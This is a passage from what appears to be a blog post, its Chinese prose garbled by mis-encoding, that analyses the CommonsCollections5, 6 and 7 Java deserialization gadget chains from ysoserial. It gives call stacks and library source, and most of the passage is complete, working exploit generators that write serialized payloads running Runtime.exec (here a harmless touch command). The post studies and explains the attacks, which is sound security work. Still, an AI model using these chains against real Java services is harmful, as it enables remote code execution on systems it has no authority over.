javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–, è¿™ä¸€æ¡é“¾, å…¶å® 3, 4 éƒ½èƒ½ä½¿ç”¨, ä¸è¿‡ ysoseiral åªåœ¨ exp é‡Œé¢å†™äº† 3 çš„, å®é™…ä¸Šåªè¦å°† import çš„ xxx.collections.xxx å…¨æ”¹æˆ xxx.collections4.xxx, ç„¶åå°† <code>LazyMap.decorate</code> æ”¹ä¸º <code>LazyMap.LazyMap</code> å°±èƒ½ç›´æ¥ç»™ 4 ä½¿ç”¨.</p><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>è¿˜æ˜¯å…ˆçœ‹è°ƒç”¨æ ˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>è¿™æ¡ä¸ CommonsCollections5 ç±»ä¼¼, è§¦å‘ç‚¹ç”± BadAttributeValueExpException æ”¹ä¸º HashSet, è¿™é‡Œä¸ URLDNS ç±»ä¼¼, åœ¨ååºåˆ—åŒ–æ—¶ä¼šé‡æ–°è®¡ç®—å¯¹è±¡çš„ hashCode, è€Œåˆšåˆšå¥½ TiedMapEntry çš„ hashCode é‡Œé¢ä¸ toString ä¸€æ ·ä¹Ÿç”¨åˆ°äº† getValue.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œæ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ HashMap å°±å·²ç»æœ‰ hashCode äº†, ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿˜è¦å†å¥—ä¸€å±‚ HashSet. æˆ‘è‡ªå·±é‡æ–°ç¼–å†™çš„æ—¶å€™æ˜¯ç›´æ¥ç”¨çš„ HashMap ä½œä¸ºè§¦å‘ç‚¹.</p><p>exp å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"placeholder"</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">"zzzz"</span>);</span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); <span class="comment">// å°†çœŸæ­£çš„ transformers è®¾ç½®, ä¸ç„¶åœ¨ç”Ÿæˆ exp æ—¶å°±ä¼šæ‰§è¡Œå‘½ä»¤, è‡ªå·±æ‰“è‡ªå·±äº†</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        innerMap.clear(); <span class="comment">// æ¸…é™¤ LazyMap äº§ç”Ÿçš„ç¼“å­˜</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·, è¿™å¥— exp åœ¨ 3, 4 éƒ½æ˜¯é€šç”¨çš„, åªéœ€è¦æ›´æ”¹ <code>LazyMap.decorate</code> å³å¯, åœ¨ 4 ä¸­æ˜¯ <code>LazyMap.LazyMap</code>, æ•ˆæœæ˜¯æ˜¯ä¸€æ ·çš„, åªæ˜¯æ–¹æ³•åæ¢äº†ä¸€ä¸ª.</p><h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><p>ä»ç„¶å…ˆçœ‹è°ƒç”¨æ ˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure><p>ä»ç„¶æ˜¯ç”¨ LazyMap å¯¼è‡´ RCE, ç›¸æ¯” TransformingComparator, LazyMap åœ¨ 3, 4 ä¸­éƒ½å¯ä»¥ç”¨, æ³›ç”¨æ€§ä¼šæ›´å¥½. è¿™é‡Œè§¦å‘ Lazy.get çš„æ–¹å¼æ˜¯åˆ©ç”¨ HashMap/Hashtable readObject ä¼šé‡å»ºå†…éƒ¨çš„å“ˆå¸Œè¡¨çš„ç‰¹æ€§. åœ¨é‡åˆ° hash ç¢°æ’çš„æ—¶å€™, ä¼šè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„ equals æ–¹æ³•æ¥å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒæ¥åˆ¤æ–­æ˜¯å¦çœŸçš„æ˜¯ hash ç¢°æ’. åœ¨è¿™ä¹‹ä¸­ä½¿ç”¨çš„æ˜¯çˆ¶ç±» <code>AbstractMap</code> çš„ equals æ–¹æ³•.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; e : entrySet()) &#123;</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key) == <span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// &lt;-- å¯¹äºæˆ‘ä»¬çš„ exp æ¥è¯´, ä¼šåœ¨è¿™é‡Œä¼šè§¦å‘</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒä¸¤ä¸ª Map çš„å¤§å°, å¹¶å¯¹æ¯”æ‰€æœ‰ key, value éƒ½ç›¸ç­‰. åœ¨å…¶ä¸­ä½¿ç”¨äº† get æ–¹æ³•, è§¦å‘äº† Lazy.get.<br>åœ¨ ysoseiral ä¸­ä½¿ç”¨çš„æ˜¯ Hashtable ç±», å®é™…ä¸Š HashMap ä¹Ÿæ˜¯èƒ½å¤Ÿè§¦å‘çš„.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))  <span class="comment">// &lt;-- è¿™é‡Œè¿›å…¥ AbstractMap.equals</span></span><br><span class="line">            e = p;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€å exp å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"placeholder"</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap1 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap1.put(<span class="string">"yy"</span>, <span class="string">"1"</span>); <span class="comment">// "yy".hashCode() == "zZ".hashCode() == 3872</span></span><br><span class="line">        HashMap innerMap2 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap2.put(<span class="string">"zZ"</span>, <span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(lazyMap1, <span class="string">"placeholder"</span>);</span><br><span class="line">        hashMap.put(lazyMap2, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        innerMap1.remove(<span class="string">"zZ"</span>); <span class="comment">// åœ¨ put çš„æ—¶å€™äº§ç”Ÿç¢°æ’, æ ¹æ®ä¸Šé¢çš„åˆ†æè°ƒç”¨ LazyMap.get, LazyMap ä¼šå°†ç»“æœå­˜å…¥ innerMap ä¸­ç¼“å­˜, æ‰€ä»¥è¿™é‡Œéœ€è¦å°†å…¶æ¸…é™¤, å¦åˆ™ hashcode å°±ä¸ä¸€æ ·äº† </span></span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); <span class="comment">// åŒä¸Š, å°†çœŸæ­£çš„ transformers è®¾ç½®, ä¸ç„¶åœ¨ç”Ÿæˆ exp æ—¶å°±ä¼šæ‰§è¡Œå‘½ä»¤, è‡ªå·±æ‰“è‡ªå·±äº†</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯ä»¥çœ‹åˆ°è¿™äº› chain æœ€åå‡éœ€è¦ç»è¿‡ InvokerTransformer æˆ–è€… InstantiateTransformer. commons-collections çš„ä¿®å¤ä¹Ÿæ˜¯ç€åŠ›äºé‡ç‚¹, ç›´æ¥ ban æ‰è¿™ä¸¤ä¸ªç±»çš„ readObject, ä¸€åŠ³æ°¸é€¸.<br>è€Œè¿™äº›ä¸­å¯¹äº commons-collections4, æ¯”è¾ƒå®ç”¨çš„æ˜¯ CommonsCollections2, CommonsCollections4. å¯¹äº commons-collections3, ä¸º CommonsCollections6, CommonsCollections7. åˆ©ç”¨èƒ½å¦æˆåŠŸåªä¸ commons-collections è‡ªèº«çš„ç‰ˆæœ¬æœ‰å…³, è€Œä¸ jre çš„ç‰ˆæœ¬æ²¡æœ‰å¤ªå¤§å…³ç³», åªè¦ä¸è¦æ˜¯è¿œå¤ç‰ˆæœ¬å³å¯. è€Œä¸”å®é™…ä¸Šä¸å°‘ chain æ˜¯ä¸¤è€…éƒ½é€šç”¨çš„, åªä¸è¿‡ ysoserial æ²¡æœ‰ç¼–å†™, åªéœ€è¦ç¨ç¨ä¿®æ”¹å°±è¡Œ.  </p>]]></content>
    
    <summary type="html">
    
